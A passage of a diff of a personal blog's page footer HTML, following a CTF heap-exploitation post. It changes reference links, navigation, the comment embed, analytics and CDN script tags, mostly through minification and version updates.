+</span></span></code></pre></td></tr></table></div></div><h2 id=ref>ref</h2><ol><li><p><a href=https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0>https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0</a></p></li><li><p><a href=http://blog.eonew.cn/archives/1190>http://blog.eonew.cn/archives/1190</a></p></li></ol></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
+<span class=item-content>hhdx</span></p><p class=copyright-item><span class=item-title>上次更新</span>
+<span class=item-content>2020-09-07</span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/ctf/>CTF</a></div><nav class=post-nav><a class=prev href=/post/arm-pwn/><i class="iconfont icon-left"></i>
 <span class="prev-text nav-default">Arm Pwn</span>
-<span class="prev-text nav-mobile">上一篇</span>
-</a>
-<a class=next href=/post/r7000%E6%A2%85%E6%9E%97%E6%90%AD%E5%BB%BAipv6%E4%BB%A3%E7%90%86/>
-<span class="next-text nav-default">R7000梅林搭建ipv6代理</span>
+<span class="prev-text nav-mobile">上一篇</span></a>
+<a class=next href=/post/r7000%E6%A2%85%E6%9E%97%E6%90%AD%E5%BB%BAipv6%E4%BB%A3%E7%90%86/><span class="next-text nav-default">R7000梅林搭建ipv6代理</span>
 <span class="next-text nav-mobile">下一篇</span>
-<i class="iconfont icon-right"></i>
-</a>
-</nav>
-</footer>
-</article>
-</div>
-<div id=disqus_thread></div>
-<script type=text/javascript>(function(){var a,b;if(window.location.hostname==='localhost')return;a=document.createElement('script'),a.type='text/javascript',a.async=!0,b='lyliuchao',a.src='//'+b+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script>
-<noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
-</div>
-</main>
-<footer id=footer class=footer>
-<div class=social-links>
-<a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
-<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a>
-<a href=https://hhdx.xyz/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a>
-</div>
-<div class=copyright>
-<span class=power-by>
-由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动
-</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="lyliuchao",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
+<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
 <span class=division>|</span>
-<span class=theme-info>
-主题 -
-<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a>
-</span>
-<span class=copyright-year>
-&copy;
+<span class=theme-info>主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
+<span class=copyright-year>&copy;
 2016 -
-2021<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span>
-</span>
-</div>
-</footer>
-<div class=back-to-top id=back-to-top>
-<i class="iconfont icon-up"></i>
-</div>
-</div>
-<script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+2023<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js integrity=sha384-NXgwF8Kv9SSAr+jemKKcbvQsz+teULH/a5UNJvZc6kP47hZgl62M1vGnw6gHQhb1 crossorigin=anonymous></script>
 <script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
 <script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
-<script type=text/javascript src=/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js></script>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-177325662-1','auto'),ga('set','anonymizeIp',!0),ga('send','pageview'))</script>
-<script async src=https://www.google-analytics.com/analytics.js></script>
-</body>
-</html>
+<script type=text/javascript src=/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js></script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-177325662-1","auto"),ga("set","anonymizeIp",!0),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></body></html>
